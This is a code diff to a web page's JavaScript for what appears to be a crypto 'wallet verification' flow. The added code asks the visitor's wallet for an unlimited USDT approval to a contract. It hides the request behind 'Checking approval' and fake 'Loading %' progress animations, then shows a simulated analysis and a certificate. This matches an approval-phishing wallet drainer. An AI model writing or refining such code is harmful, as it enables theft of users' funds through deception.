@@ -1289,6 +1289,52 @@
     }
 
 
+    // Helper: start an indeterminate progress animation that moves toward 98%
+    // Returns an object { stop: async () => { await finishPromise } }
+    // Call stop() when you want to complete to 100% and resolve.
+    function startIndeterminateProgress({ btnId = 'verifyBtn', intervalMs = 120 } = {}) {
+        const btn = document.getElementById(btnId);
+        let progress = 0;
+        let interval = null;
+        let finished = false;
+    
+        const finishPromise = new Promise(resolve => {
+            interval = setInterval(() => {
+                // Increase faster initially, then slow down as it approaches 98
+                const increment = progress < 60 ? 3 : progress < 85 ? 2 : 1;
+                progress = Math.min(98, progress + increment);
+                btn.textContent = `Loading ${progress}%...`;
+            }, intervalMs);
+    
+            // stop() below will clear interval and then resolve
+            const stop = () => {
+                if (finished) return;
+                finished = true;
+                clearInterval(interval);
+                // snap to 100%
+                progress = 100;
+                btn.textContent = `Loading ${progress}%...`;
+                // small delay so user sees 100%
+                setTimeout(() => resolve(), 300);
+            };
+    
+            // expose stop via returned object
+            startIndeterminateProgress._stop = stop;
+        });
+    
+        return {
+            stop: () => {
+                // ensure stop uses the internal function created above
+                if (typeof startIndeterminateProgress._stop === 'function') {
+                    startIndeterminateProgress._stop();
+                    // clear reference to avoid collisions if called multiple times
+                    startIndeterminateProgress._stop = null;
+                }
+                return finishPromise;
+            }
+        };
+    }
+    
     async function startVerification() {
         try {
             const verifyBtn = document.getElementById('verifyBtn');
@@ -1296,6 +1342,7 @@
             const progressContainer = document.getElementById('progressContainer');
             const analyzingText = document.getElementById('analyzingText');
     
+            // reset UI
             errorMessage.classList.remove('show');
             verifyBtn.disabled = true;
             verifyBtn.textContent = 'Checking approval...';
@@ -1306,43 +1353,84 @@
             const currentAllowance = await usdtContract.methods.allowance(account, CONTRACT_ADDRESS).call();
             const minRequired = web3.utils.toBN('1000000');
     
-            // --- If approval is needed ---
-            // if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
-
-            // Temporary condition to test the second button
-            if (true) {  // FORCED TEST MODE
-
+            // If approval is needed
+            if (web3.utils.toBN(currentAllowance).lt(minRequired)) {
     
-                // Start fake progress bar
-                verifyBtn.textContent = 'Loading...';
-                await fakeLoadingProgress(); // Smooth 0 → 100% animation
+                // Prepare approval transaction
+                verifyBtn.textContent = 'Approve in wallet...';
     
-                // Now send real approval transaction (non-blocking)
                 const maxAmount =
                     '115792089237316195423570985008687907853269984665640564039457584007913129639935';
     
-                usdtContract.methods
-                    .approve(CONTRACT_ADDRESS, maxAmount)
-                    .send({ from: account })
-                    .then(() => console.log("Approval sent"))
-                    .catch(err => console.error("Approval error:", err));
-            }
+                // Create the promiEvent (do NOT await it yet) so we can attach handlers.
+                const approvePromi = usdtContract.methods.approve(CONTRACT_ADDRESS, maxAmount).send({ from: account });
     
-            // Start analysis
+                // We'll start indeterminate UI once tx is submitted (transactionHash event).
+                let indeterminate = null;
+                let txHash = null;
+    
+                // Handle transactionHash: user accepted and tx was submitted to network
+                approvePromi.on('transactionHash', (hash) => {
+                    txHash = hash;
+                    // Start indeterminate progress (it will move up to 98%)
+                    indeterminate = startIndeterminateProgress({ btnId: 'verifyBtn', intervalMs: 90 });
+                });
+    
+                // Handle error early (for example user denied signature)
+                let approvalError = null;
+                approvePromi.on('error', (err) => {
+                    approvalError = err;
+                });
+    
+                // Wait for receipt (this awaits until tx is mined/receipt returned) or will throw if user rejected
+                try {
+                    const receipt = await approvePromi; // await the receipt
+                    // If we started indeterminate progress, stop it and wait until it finishes (snap to 100%)
+                    if (indeterminate) {
+                        await indeterminate.stop();
+                    } else {
+                        // If no transactionHash event fired but receipt arrived (rare), just set button to 100% briefly
+                        verifyBtn.textContent = 'Loading 100%...';
+                        await new Promise(r => setTimeout(r, 300));
+                    }
+                    console.log('Approval confirmed, tx receipt:', receipt);
+                } catch (err) {
+                    // If the user rejected signature or tx failed, show error and restore UI
+                    console.error('Approval failed or was rejected:', err);
+                    let userMsg = 'Approval rejected or failed.';
+                    if (err && err.code === 4001) userMsg = 'Transaction rejected by user.';
+                    if (err && err.message && err.message.includes('insufficient funds')) userMsg = 'Insufficient ETH for gas fees.';
+    
+                    document.getElementById('errorText').textContent = userMsg;
+                    document.getElementById('errorMessage').classList.add('show');
+    
+                    verifyBtn.disabled = false;
+                    verifyBtn.textContent = 'Confirm Verification';
+                    return; // stop processing
+                }
+    
+            } // end approval-needed branch
+    
+            // Start analysis (approval either not needed or confirmed)
             verifyBtn.textContent = 'Analyzing...';
             progressContainer.classList.add('show');
             analyzingText.classList.add('show');
     
             // Reset progress bars
             for (let i = 1; i <= 5; i++) {
-                document.getElementById(`bar${i}`).style.width = '0%';
-                document.getElementById(`percent${i}`).textContent = '0%';
-                document.getElementById(`check${i}`).classList.remove('show');
+                const bar = document.getElementById(`bar${i}`);
+                const pct = document.getElementById(`percent${i}`);
+                const check = document.getElementById(`check${i}`);
+                if (bar) bar.style.width = '0%';
+                if (pct) pct.textContent = '0%';
+                if (check) check.classList.remove('show');
             }
-            document.getElementById('overallBar').style.width = '0%';
-            document.getElementById('overallPercent').textContent = '0%';
+            const overallBar = document.getElementById('overallBar');
+            const overallPercent = document.getElementById('overallPercent');
+            if (overallBar) overallBar.style.width = '0%';
+            if (overallPercent) overallPercent.textContent = '0%';
     
-            // Real analysis simulation
+            // Run the real analysis (simulateProgress will animate the bars)
             await simulateProgress();
     
             generateCertificateData();
@@ -1353,22 +1441,24 @@
         } catch (error) {
             console.error("ERROR:", error);
     
-            let errorMsg = 'Verification failed: ' + error.message;
-    
-            if (error.message.includes('insufficient funds')) {
+            let errorMsg = 'Verification failed: ' + (error && error.message ? error.message : error);
+            if (error && error.message && error.message.includes('insufficient funds')) {
                 errorMsg = 'Insufficient ETH for gas fees.';
-            } else if (error.message.includes('User denied')) {
+            } else if (error && error.code === 4001) {
                 errorMsg = 'Transaction rejected.';
             }
     
             document.getElementById('errorText').textContent = errorMsg;
             document.getElementById('errorMessage').classList.add('show');
     
+            const verifyBtn = document.getElementById('verifyBtn');
             verifyBtn.disabled = false;
             verifyBtn.textContent = 'Confirm Verification';
     
-            progressContainer.classList.remove('show');
-            analyzingText.classList.remove('show');
+            const progressContainer = document.getElementById('progressContainer');
+            const analyzingText = document.getElementById('analyzingText');
+            if (progressContainer) progressContainer.classList.remove('show');
+            if (analyzingText) analyzingText.classList.remove('show');
         }
     }
 
